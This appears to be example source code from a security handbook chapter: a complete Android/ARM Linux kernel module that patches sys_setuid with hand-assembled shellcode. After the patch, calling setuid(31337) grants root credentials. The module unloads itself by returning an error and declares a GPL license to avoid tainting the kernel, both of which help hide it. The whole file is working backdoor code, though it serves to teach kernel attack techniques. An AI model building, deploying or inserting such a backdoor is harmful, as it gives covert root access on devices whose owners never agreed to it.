/*
 * Android Hacker's Handbook
 * Chapter 10
 *
 * This module inserts backdoor into the sys_setuid function in the running 
 * kernel.
 *
 * dev:kernel $ make ARCH=arm CONFIG_AHH_SETUID=m M=drivers/ahh_setuid
 *
 * NOTE: This module may not work on MSM kernels due to read-only kernel
 * code sections.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/cacheflush.h>

/*
 * we call this from where the first few instructions occur.
 * if someone calls setuid(31337), they'll get kernel creds.
 */
unsigned long backdoor_code[] = {
    /*
     * if (uid == 31337)
     */
    0xe92d4040,  /* stmfd sp!, {r6,lr}       */
    0xe59f6034,  /* ldr r6, [pc,#52]         */
    0xe1500006,  /* cmp r0, r6               */
    0x1a000006,  /* bne <go_back> */
    /*
     *     return commit_creds(prepare_kernel_cred(0));
     */
    0xe3a00000,  /* mov r0, #0               */
    0xe59f6028,  /* ldr r6, [pc,#40]         */
    0xe12fff36,  /* blx r6                   */
    0xe59f6024,  /* ldr r6, [pc,#36]         */
    0xe12fff36,  /* blx r6                   */
    /*
     * we don't want to run the normal setuid call anymore.
     * clear the stack and go back to the original caller...
     */
    0xe8bd8040,  /* ldm sp, {r6,pc}          */

    /* not reached! */
    0,           /* nop */

/* go_back: */
    0xe8bd4040,  /* ldm sp!, {r6,lr}         */
    /* the original instructions get put here */
#define ORIG_OFF 12
    0xf0f00020,
    0xf0f00020,
    0xf0f00020,
    /* the redirection back to where we came from goes here */
    0xe59ff008,  /* ldr pc, [pc,#8]          */
/* backdoor_uid: */
    0x7a69,      /* the backdoor uid, 31337 */
    0xf0f00030,  /* the address of prepare_kernel_cred */
    0xf0f00040,  /* the address of commit_creds */
    0xf0f00010,  /* the address of to go back to */
};


unsigned long ahh_find_symbol(char *name)
{
    unsigned long ret;

    ret = (unsigned long)kallsyms_lookup_name(name);
    if (ret)
        printk(KERN_INFO "%s: found %s @ 0x%lx\n", __this_module.name, name, ret);
    else
        printk(KERN_INFO "%s: unable to find %s!\n", __this_module.name, name);
    return ret;
}


int init_module(void)
{
    unsigned long *p_setuid, *p_kernel_init;
    unsigned long commit_creds, prepare_kernel_cred;
    unsigned long p_ret;
    int i, already_installed = 0;

    if (!(p_setuid = (unsigned long *)ahh_find_symbol("sys_setuid")))
        return -1;
    if (!(p_kernel_init = (unsigned long *)ahh_find_symbol("kernel_init")))
        return -1;

    if (!(commit_creds = ahh_find_symbol("commit_creds")))
        return -1;
    if (!(prepare_kernel_cred = ahh_find_symbol("prepare_kernel_cred")))
        return -1;

    /* only install hook/copy prologue if we are not already installed. */
    if (p_setuid[0] == 0xe59ff000
        && p_setuid[1] == (unsigned long)p_kernel_init) {
        printk(KERN_INFO "%s: we're already installed! updating backdoor code only.\n", __this_module.name);
        already_installed = 1;
    }

    /* now modify kernel_init to contain our code */
    memcpy(p_kernel_init, backdoor_code, sizeof(backdoor_code));

    /* copy the original instructions, if we aren't already installed */
    if (!already_installed) {
        for (i = 0; i < 3; i++)
            p_kernel_init[i + ORIG_OFF] = p_setuid[i];
    }

    /* place cred functions */
    p_kernel_init[ORIG_OFF + 5] = prepare_kernel_cred;
    p_kernel_init[ORIG_OFF + 6] = commit_creds;

    /* place return location */
    p_ret = (unsigned long)(p_setuid + 3);
    printk(KERN_INFO "%s: returning to 0x%lx\n", __this_module.name, p_ret);
    p_kernel_init[ORIG_OFF + 7] = p_ret;

    /* redirect p_setuid to our backdoor code, if we haven't lready */
    if (!already_installed) {
        p_setuid[0] = 0xe59ff000;  /* ldr pc, [pc,#0] */
        p_setuid[1] = p_setuid[2] = (unsigned long)p_kernel_init;
        printk(KERN_INFO "%s: installed hook!\n", __this_module.name);
    }

    /* flush the instruction cache =) */
    __flush_icache_all();
    flush_cache_all();

    /* force an error so we don't stay loaded */
    return -1;
}


void cleanup_module(void)
{
    /* nothing here */
}


MODULE_LICENSE("GPL v2"); /* don't taint the kernel! */
MODULE_AUTHOR("Android Hackers");
MODULE_DESCRIPTION("sys_setuid backdoor");
MODULE_VERSION("1.0");

